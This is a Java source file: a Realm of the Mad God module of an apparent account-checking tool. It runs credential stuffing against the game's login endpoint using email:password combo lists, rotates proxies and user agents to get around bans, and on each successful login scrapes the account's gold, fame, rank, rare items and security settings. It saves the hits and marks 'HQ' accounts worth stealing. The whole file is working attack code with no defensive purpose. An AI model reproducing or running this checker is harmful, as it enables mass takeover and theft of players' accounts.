package nobility.moduleshandler.modules.rotmg;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import nobility.model.Model;
import nobility.moduleshandler.modules.hits.Hit;
import nobility.moduleshandler.settings.ComboContainer;
import nobility.moduleshandler.settings.ProxyContainer;
import nobility.save.Defaults;
import nobility.tools.ProxiedHttpsConnection;
import org.apache.commons.text.TextStringBuilder;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Map;
import java.util.concurrent.Callable;
import java.util.concurrent.ConcurrentHashMap;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class RealmOfTheMadGodCore implements Callable<String> {

    private ProxyContainer proxy;
    private final Map<Integer, Integer> items = new ConcurrentHashMap<>();
    private TextStringBuilder characterInfo;
    private ComboContainer combo;
    private final Model model;

    public RealmOfTheMadGodCore(Model model) {
        this.model = model;
    }

    @Override
    public String call() {
        model.module().settings().addThread();
        while (model.module().settings().isRunning()) {
            if (combo == null) {
                combo = model.collects().getCombo();
                if (combo == null) {
                    break;
                }
                if (combo.getPassword().length() < 8 && model.save().getBoolean(Defaults.SKIPTOOSHORT)) {
                    combo = null;
                    continue;
                }
                if (model.save().getBoolean(Defaults.SAVECHECKED)) {
                    if (model.collects().getCheckedList().contains(combo.toString())) {
                        combo = null;
                        continue;
                    }
                }
            }
            login();
        }
        model.module().settings().removeThread();
        if (combo != null) {
            return combo.toString();
        }
        return null;
    }

    private void login() {
        if (proxy == null) {
            proxy = model.module().getNextProxy();
        }
        try {
            TextStringBuilder keyBody = new TextStringBuilder();
            String keyUrl = "https://www.realmofthemadgod.com/account/verify?guid=<USER>&password=<PASS>&clientToken=65d2833b891463ec28bcc5eba844af2dc6af50af&game_net=Unity&play_platform=Unity&game_net_user_id="
                    .replace("<USER>", combo.getEmail())
                    .replace("<PASS>", combo.getPassword());

            if (proxy.getUsername() != null && proxy.getPassword() != null) {
                URL temp = new URL(keyUrl);
                URL newUrl = new URL(temp.getProtocol(), temp.getHost(), 443, temp.getFile());
                ProxiedHttpsConnection con = new ProxiedHttpsConnection(newUrl,
                        proxy.getIp(), proxy.getPort(),
                        proxy.getUsername(), proxy.getPassword());
                con.setRequestMethod("GET");
                con.addRequestProperty("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
                con.addRequestProperty("sec-fetch-dest", "document");
                con.addRequestProperty("sec-fetch-mode", "navigate");
                con.addRequestProperty("sec-fetch-site", "none");
                con.addRequestProperty("sec-fetch-user", "?1");
                con.addRequestProperty("upgrade-insecure-requests", "1");
                con.addRequestProperty("User-Agent", model.module().getRandomUserAgent());
                con.setConnectTimeout(model.getTimeouts() * 1000);
                con.setReadTimeout(model.getTimeouts() * 1000);
                BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
                String inputLine;
                while ((inputLine = in.readLine()) != null) {
                    keyBody.append(inputLine).append("\n");
                }
                in.close();
                //System.out.println(keyBody.toString());
            } else {
                Proxy.Type type = model.save().getBoolean(Defaults.SOCKS) ? Proxy.Type.SOCKS : Proxy.Type.HTTP;
                Proxy p = new Proxy(type, new InetSocketAddress(proxy.getIp(), proxy.getPort()));
                HttpURLConnection con = (HttpURLConnection)
                        new URL(keyUrl).openConnection(p);
                con.setRequestMethod("GET");
                con.addRequestProperty("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
                con.addRequestProperty("sec-fetch-dest", "document");
                con.addRequestProperty("sec-fetch-mode", "navigate");
                con.addRequestProperty("sec-fetch-site", "none");
                con.addRequestProperty("sec-fetch-user", "?1");
                con.addRequestProperty("upgrade-insecure-requests", "1");
                con.addRequestProperty("User-Agent", model.module().getRandomUserAgent());
                con.setConnectTimeout(model.getTimeouts() * 1000);
                con.setReadTimeout(model.getTimeouts() * 1000);
                con.setInstanceFollowRedirects(true);
                BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
                String inputLine;
                while ((inputLine = in.readLine()) != null) {
                    keyBody.append(inputLine).append("\n");
                }
                in.close();
            }

            if (keyBody.toString().contains(RotmgData.INVALIDCREDENTIALSERROR.getIdentifier())) {
                model.module().settings().addInvalid();
                combo = null;
                return;
            }

            if (keyBody.toString().contains(RotmgData.NOCLIENTTOKENERROR.getIdentifier())) {
                model.module().settings().addError();
                return;
            }

            //sometimes its Internal Error (for 10) and 5 is Internal error
            if (keyBody.toString().toLowerCase().contains(RotmgData.PROXYBANNED.getIdentifier().toLowerCase())) {
                String time = keyBody.toString().contains("5") ? "5" : "10";
                model.module().settings().addError();
                model.printProxyErrors("Proxy: " + proxy.toString() + " Banned for " + time + " minutes.");
                proxy = null;
                return;
            }

            if (keyBody.toString().contains(RotmgData.INVALIDEMAIL.getIdentifier())) {
                model.printDebug("Malformed email: " + combo.getEmail() + " Skipping combo...");
                model.module().settings().addInvalid();
                combo = null;
                return;
            }

            if (keyBody.toString().contains(RotmgData.MIGRATING.getIdentifier())) {
                model.module().settings().addInvalid();
                combo = null;
                return;
            }

            //System.out.println(keyBody.toString());
            String token = parseResult("AccessToken", keyBody.toString());

            if (token == null) {
                model.module().settings().addError();
                model.printDebug("Error getting access token for " + combo.getEmail() + "\n"
                        + "Error: " + keyBody);
                proxy = null;
                return;
            }

            characterInfo = new TextStringBuilder();
            String url = "https://www.realmofthemadgod.com/char/list?do_login=true&accessToken=<TOKEN>&game_net=Unity&play_platform=Unity&game_net_user_id="
                    .replace("<TOKEN>", encodeValue(token));
            if (proxy.getUsername() != null && proxy.getPassword() != null) {
                URL temp = new URL(url);
                URL newUrl = new URL(temp.getProtocol(), temp.getHost(), 443, temp.getFile());
                ProxiedHttpsConnection con = new ProxiedHttpsConnection(newUrl,
                        proxy.getIp(), proxy.getPort(),
                        proxy.getUsername(), proxy.getPassword());
                con.setRequestMethod("GET");
                con.addRequestProperty("Content-Type", "text/plain; charset=utf-8");
                con.addRequestProperty("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
                con.addRequestProperty("sec-fetch-dest", "document");
                con.addRequestProperty("sec-fetch-mode", "navigate");
                con.addRequestProperty("sec-fetch-site", "none");
                con.addRequestProperty("sec-fetch-user", "?1");
                con.addRequestProperty("upgrade-insecure-requests", "1");
                con.addRequestProperty("User-Agent", model.module().getRandomUserAgent());
                con.setConnectTimeout(model.getTimeouts() * 1000);
                con.setReadTimeout(model.getTimeouts() * 1000);
                BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
                String inputLine;
                while ((inputLine = in.readLine()) != null) {
                    characterInfo.append(inputLine).append("\n");
                }
                in.close();
                //System.out.println(characterInfo.toString());
            } else {
                Proxy.Type type = model.save().getBoolean(Defaults.SOCKS) ? Proxy.Type.SOCKS : Proxy.Type.HTTP;
                Proxy p = new Proxy(type, new InetSocketAddress(proxy.getIp(), proxy.getPort()));
                HttpURLConnection con = (HttpURLConnection)
                        new URL(url).openConnection(p);
                con.setRequestMethod("GET");
                con.addRequestProperty("Content-Type", "text/plain; charset=utf-8");
                con.addRequestProperty("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
                con.addRequestProperty("sec-fetch-dest", "document");
                con.addRequestProperty("sec-fetch-mode", "navigate");
                con.addRequestProperty("sec-fetch-site", "none");
                con.addRequestProperty("sec-fetch-user", "?1");
                con.addRequestProperty("upgrade-insecure-requests", "1");
                con.addRequestProperty("User-Agent", model.module().getRandomUserAgent());
                con.setConnectTimeout(model.getTimeouts() * 1000);
                con.setReadTimeout(model.getTimeouts() * 1000);
                con.setInstanceFollowRedirects(true);
                BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
                String inputLine;
                while ((inputLine = in.readLine()) != null) {
                    characterInfo.append(inputLine).append("\n");
                }
                in.close();
            }
        } catch (Exception e) {
            //e.printStackTrace();
            if (model.getCheckerRetries() != 0) {
                if (!(proxy.getRetries() >= model.getCheckerRetries())) {
                    proxy.addRetry();
                    model.module().settings().addRetry();
                    return;
                }
                proxy.setRetries(0);
                model.module().settings().addError();
                model.printProxyErrors("Proxy: " + proxy.toString() + " Failed.");
                proxy = null;
                return;
            }
        }

        //System.out.println("Char: " + characterInfo);

        if (characterInfo.toString().contains(RotmgData.CHARINVALIDCREDENTIALSERROR.getIdentifier())) {
            model.module().settings().addError();
            model.printProxyErrors("Retrying with new proxy. Invalid token for " + combo.getEmail());
            proxy = null;
            return;
        }

        if (characterInfo.toString().contains(RotmgData.NEEDSTOACCEPTTERMSERROR.getIdentifier())) {
            //model.module().getSettings().addProgress();
            TextStringBuilder results = new TextStringBuilder();
            results.appendNewLine();
            results.append("Requires TOS accepting to view info.");
            results.appendNewLine();
            if (combo.getPassword().length() < 8) {
                results.append("Password is lower than 8 characters.");
                results.appendNewLine();
            }
            model.writeToHits(new Hit(combo.getEmail(), combo.getPassword(),
                    model.save().getString(Defaults.SEPERATOR), false, results, proxy.toString()));
            combo = null;
            return;
        }
        checkResults();
        combo = null;
    }

    private String encodeValue(String value) throws UnsupportedEncodingException {
        return URLEncoder.encode(value, StandardCharsets.UTF_8.toString());
    }

    private String parseResult(String identifier, String data) {
        try {
            String id1 = "<" + identifier + ">";
            String id2 = "</" + identifier + ">";
            return data.substring(data.indexOf(id1) + id1.length(), data.indexOf(id2)).trim();
        } catch (Exception ignored) {}
        return null;
    }

    private void checkResults() {
        //model.module().settings().addProgress();
        if (model.save().getBoolean(Defaults.NAMECHOSEN)
                && !characterInfo.contains("<NameChosen/>")) {
            return;
        }
        TextStringBuilder results = new TextStringBuilder();
        String gold;
        String fame;
        String name;
        int petyard;
        boolean HQ = false;
        TextStringBuilder equipmentLength = new TextStringBuilder();
        TextStringBuilder hqSource = new TextStringBuilder();
        name = parseResult("Name", characterInfo.toString());
        if (name != null) {
            results.appendNewLine();
            results.append("Name: ").append(name);
        }

        String created = parseResult("CreationDate", characterInfo.toString());
        if (created != null) {
            results.appendNewLine();
            results.append("Creation Date: ").append(created);
        }

        gold = parseResult("Credits", characterInfo.toString());
        if (gold != null) {
            results.appendNewLine();
            results.append("Gold: ").append(gold);

            if (model.save().getInteger(Defaults.HQGOLD) != 0) {
                if (Integer.parseInt(gold) >= model.save().getInteger(Defaults.HQGOLD)) {
                    HQ = true;
                    hqSource.append("Gold, ");
                }
            }
        }

        fame = parseResult("Fame", characterInfo.toString());
        if (fame != null) {
            results.appendNewLine();
            results.append("Fame: ").append(fame);

            if (model.save().getInteger(Defaults.HQFAME) != 0) {
                if (Integer.parseInt(fame) >= model.save().getInteger(Defaults.HQFAME)) {
                    if (!HQ) {
                        HQ = true;
                        hqSource.append("Fame, ");
                    }
                }
            }
        }

        String ffe = parseResult("ForgeFireEnergy", characterInfo.toString());
        if (ffe != null) {
            results.appendNewLine();
            results.append("Forge Fire Energy: ").append(ffe);
        }

        Matcher rankStart = Pattern.compile("(?=(<bestfame>))").matcher(characterInfo.toString().toLowerCase());
        Matcher rankEnd = Pattern.compile("(?=(</bestfame>))").matcher(characterInfo.toString().toLowerCase());
        List<Integer> rankIndexStart = new ArrayList<>();
        List<Integer> rankIndexEnd = new ArrayList<>();
        int stars = 0;

        while (rankStart.find()) {
            rankIndexStart.add(rankStart.start());
        }
        while (rankEnd.find()) {
            rankIndexEnd.add(rankEnd.start());
        }
        for (int i = 0; i < rankIndexStart.size(); i++) {
            int bestFame = Integer.parseInt(characterInfo.toString().toLowerCase()
                    .substring(rankIndexStart.get(i) + 10, rankIndexEnd.get(i)));
            //System.out.println("Best fame: " + bestFame);
            if (bestFame >= 20) {
                stars++;
            }
            if (bestFame >= 150) {
                stars++;
            }
            if (bestFame >= 400) {
                stars++;
            }
            if (bestFame >= 800) {
                stars++;
            }
            if (bestFame >= 2000) {
                stars++;
            }
        }

        if (model.save().getInteger(Defaults.HQRANK) != 0) {
            if (stars >= model.save().getInteger(Defaults.HQRANK)) {
                if (!HQ) {
                    HQ = true;
                    hqSource.append("Rank, ");
                }
            }
        }

        results.appendNewLine();
        results.append("Rank: ").append(String.valueOf(stars));

        try {
            String guild = characterInfo.toString().toLowerCase().substring(characterInfo.toString().toLowerCase()
                    .indexOf("<guild id=") + 10, characterInfo.toString().toLowerCase().indexOf("</guild>"));
            String guildName = guild.substring(guild.indexOf("<name>") + 6, guild.indexOf("</name>"));
            results.appendNewLine();
            results.append("Guild Name: ").append(guildName.trim());
        } catch (Exception ignored) {}

        String petYardType = parseResult("PetYardType", characterInfo.toString());
        if (petYardType != null) {
            petyard = Integer.parseInt(petYardType);
            results.appendNewLine();
            results.append("Pet Yard Level: ").append(petyardOutput(petyard));
            if (petYardType.equalsIgnoreCase(model.save().getString(Defaults.HQPETRARITY))) {
                hqSource.append("Pet Yard, ");
                HQ = true;
            }
        }
        if (!model.getItemParser().getSelectedMap().isEmpty()) {
            String content = characterInfo.toString().toLowerCase().replaceAll("</equipment>", ",</equipment>");
            Matcher equipmentStart = Pattern.compile("(?=(<equipment>))").matcher(content);
            Matcher equipmentEnd = Pattern.compile("(?=(</equipment>))").matcher(content);
            List<Integer> equipmentIndexStart = new ArrayList<>();
            List<Integer> equipmentIndexEnd = new ArrayList<>();
            while (equipmentStart.find()) {
                equipmentIndexStart.add(equipmentStart.start());
            }
            while (equipmentEnd.find()) {
                equipmentIndexEnd.add(equipmentEnd.start());
            }
            List<Integer> equipmentItems = new ArrayList<>();
            for (int i = 0; i < equipmentIndexStart.size(); i++) {
                try {
                    String line = content.substring((equipmentIndexStart.get(i) + 11), (equipmentIndexEnd.get(i)));
                    if (!line.isEmpty())
                        equipmentLength.append(line);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
            for (String s : equipmentLength.toString().split(",")) {
                if (!s.isEmpty() && !s.contains("-1")) {
                    int i = Integer.parseInt(s.replace("t>", "").replace(">", "").trim());
                    equipmentItems.add(i);
                    //System.out.println("Found item: " + i + " : " + email);
                    if (model.getItemParser().getSelectedMap().containsKey(i)) {
                        if (items.containsKey(i)) {
                            items.replace(i, (items.get(i) + 1));
                        } else {
                            items.put(i, 1);
                        }
                    }
                }
            }
            results.appendNewLine();
            results.append("Equipment Items: ").append(String.valueOf(equipmentItems.size()));

            if (!items.isEmpty()) {
                for (int i : items.keySet()) {
                    int amount = items.get(i);
                    int requiredAmount = model.getItemParser().getSelectedMap().get(i);
                    if (amount != 0 && amount < requiredAmount) {
                        items.remove(i);
                    }
                }
            }

            if (compareItems(equipmentItems)) {
                if (!HQ) {
                    HQ = true;
                    hqSource.append("Items, ");
                }
                if (!items.isEmpty()) {
                    results.appendNewLine();
                    results.append("Items: ");
                    for (int i : items.keySet()) {
                        results.append(model.getItemParser().idToName(i)).append(": ")
                                .append(String.valueOf(items.get(i))).append(", ");
                    }
                }
            }
        }

        String characters = characterInfo.toString().toLowerCase().substring(characterInfo.toString().toLowerCase()
                .indexOf("maxnumchars=") + 12, characterInfo.toString().toLowerCase().indexOf("maxnumchars=") + 15);
        int characterSlots = Integer.parseInt(characters.replace("\"", "").trim());
        results.appendNewLine();
        results.append("Character Slots: ").append(String.valueOf(characterSlots));
        if (model.save().getInteger(Defaults.HQCHARS) != 0) {
            if (characterSlots >= model.save().getInteger(Defaults.HQCHARS)) {
                if (!HQ) {
                    HQ = true;
                    hqSource.append("Character Slots");
                }
            }
        }
        String stats;
        if (model.save().getBoolean(Defaults.CHECKREALMEYE)) {
            stats = checkNameForStats(name.trim());
            results.appendNewLine();
            if (stats != null) {
                if (stats.equals("error")) {
                    results.append("Error");
                } else {
                    results.append(stats);
                }
            } else {
                results.append("Private Profile");
            }
        }

        if (characterInfo.toString().toLowerCase().contains("hassec")) {
            String sec = parseResult("HasSecurityQuestions", characterInfo.toString());
            if (sec != null) {
                boolean hassec = Integer.parseInt(sec) == 1;
                if (!hassec) {
                    results.appendNewLine();
                    results.append("No Security Questions Found");
                }
            }
        }
        if (!characterInfo.toString().toLowerCase().contains("<verifiedemail/>")) {
            results.appendNewLine();
            results.append("Unverified Email");
        }
        results.appendNewLine();
        if (!hqSource.isEmpty()) {
            results.append("HQ Source: ").append(hqSource.toString());
            results.appendNewLine();
        }

        if (combo.getPassword().length() < 8) {
            results.append("Password is lower than 8 characters.");
            results.appendNewLine();
        }
        if (model.save().getBoolean(Defaults.SAVENAMESINFILE)) {
            model.collects().getNameList().add(name + " - " + combo.toString());
        }
        if (model.save().getBoolean(Defaults.SAVEGOLDINFILE) && Integer.parseInt(gold) != 0) {
            model.collects().getGoldMap().put(combo.toString(), Integer.parseInt(gold));
        }
        if (model.save().getBoolean(Defaults.SAVERANKINFILE) && stars != 0) {
            model.collects().getRankMap().put(combo.toString(), stars);
        }
        model.writeToHits(new Hit(combo.getEmail(), combo.getPassword(),
                model.save().getString(Defaults.SEPERATOR), HQ, results, proxy.toString()));
    }

    private String petyardOutput(int i) {
        switch(i) {
            case 0:
            case 1:
                return "Common";
            case 2:
                return "Uncommon";
            case 3:
                return "Rare";
            case 4:
                return "Legendary";
            case 5:
                return "Divine";
            case 6:
                return "Godly";
            default:
                return "Error";
        }
    }

    /*private boolean compareItems(List<Integer> bank, List<Integer> equip) {
        List<Integer> selected = new ArrayList<>(Controller.instance().getItemParser().getSelectedMap().keySet());
        return !Collections.disjoint(selected, bank) || !Collections.disjoint(selected, equip);
    }*/

    private boolean compareItems(List<Integer> equip) {
        List<Integer> selected = new ArrayList<>(model.getItemParser().getSelectedMap().keySet());
        return !Collections.disjoint(selected, equip);
    }

    private String checkNameForStats(String name) {
        TextStringBuilder stringBuilder;
        JsonObject json = null;
        int retries = 0;
        boolean limited = false;
        while (json == null) {
            try {
                HttpURLConnection con;
                if (limited) {
                    Proxy.Type type = model.save().getBoolean(Defaults.SOCKS) ? Proxy.Type.SOCKS : Proxy.Type.HTTP;
                    ProxyContainer newProxy = model.module().getRandomProxy();
                    if (newProxy == null) {
                        newProxy = proxy;
                    }
                    Proxy p = new Proxy(type, new InetSocketAddress(newProxy.getIp(), newProxy.getPort()));
                    con = (HttpURLConnection) new URL("https://nightfirec.at/realmeye-api/?player="
                            + name).openConnection(p);
                } else {
                    con = (HttpURLConnection) new URL("https://nightfirec.at/realmeye-api/?player="
                            + name).openConnection();
                }
                con.setRequestMethod("GET");
                con.addRequestProperty("User-Agent", model.module().getRandomUserAgent());
                con.setConnectTimeout(10_000);
                con.setReadTimeout(10_000);
                con.setInstanceFollowRedirects(true);
                BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
                stringBuilder = new TextStringBuilder();
                String inputLine;
                while ((inputLine = in.readLine()) != null) {
                    stringBuilder.append(inputLine).append("\n");
                }
                in.close();
                if (stringBuilder.toString().isEmpty()) {
                    continue;
                }
                json = toJson(stringBuilder.toString());
                if (json.toString().contains("could not be found")) {
                    return null;
                }
                if (!json.toString().contains("account_fame")) {
                    //System.out.println(json.toString());
                    json = null;
                    limited = true;
                }
            } catch (Exception e) {
                e.printStackTrace();
                if (e.getLocalizedMessage().contains("Permission denied: connect")) {
                    continue;
                }
                e.printStackTrace();
                if (!limited) limited = true;
                if (retries >= model.save().getInteger(Defaults.REALMEYERETRIES)) {
                    return "error";
                }
                retries++;
            }
        }
        TextStringBuilder sb = new TextStringBuilder();
        List<String> classNames = new ArrayList<>();
        List<String> classStats = new ArrayList<>();
        if (!json.get("characters").toString().replaceAll("\\[", "")
                .replaceAll("]", "").isEmpty()) {
            String characterList = json.get("characters").toString();
            //System.out.println(characterList);
            Matcher classStart = Pattern.compile("(?=(\"class\":\"))").matcher(characterList);
            Matcher classEnd = Pattern.compile("(?=(\",\"cqc\"))").matcher(characterList);
            List<Integer> startIndex = new ArrayList<>();
            List<Integer> endIndex = new ArrayList<>();
            while (classStart.find()) {
                startIndex.add(classStart.start() + 9);
            }
            while (classEnd.find()) {
                endIndex.add(classEnd.start());
            }
            for (int i = 0; i < startIndex.size(); i++) {
                classNames.add(characterList.substring(startIndex.get(i), endIndex.get(i)));
            }

            Matcher statsStart = Pattern.compile("(?=(\"stats_maxed\":))").matcher(characterList);
            Matcher statsEnd = Pattern.compile("(?=(},\\{\"backpack\"))").matcher(characterList);
            startIndex = new ArrayList<>();
            endIndex = new ArrayList<>();
            while (statsStart.find()) {
                startIndex.add(statsStart.start() + 14);
            }
            while (statsEnd.find()) {
                endIndex.add(statsEnd.start());
            }
            for (int i = 0; i < startIndex.size(); i++) {
                try {
                    classStats.add(characterList.substring(startIndex.get(i), endIndex.get(i)));
                } catch (Exception e) {
                    classStats.add(characterList.substring(startIndex.get(i), characterList.indexOf("}]")));
                }
            }
        }
        String created = json.get("created").toString();
        if (created != null && created.length() > 0) {
            sb.append("Created: ").append(json.get("created")).appendNewLine();
        }
        sb.append("Last Seen Active: ").append(json.get("player_last_seen"));
                //.append("Created: ").append((created ? json.get("created") : "hidden")).appendNewLine()
                //.append("Characters: ");
        if (!classNames.isEmpty()) {
            for (int i = 0; i < classNames.size(); i++) {
                sb.appendNewLine();
                sb.append("Characters: ");
                sb.append(classNames.get(i)).append(": ").append(classStats.get(i)).append("/8").append(" ");
            }
        }
        if (sb.isEmpty()) {
            return null;
        }
        return sb.toString();
    }

    private JsonObject toJson(String response) {
        return new JsonParser().parse(response).getAsJsonObject();
    }

}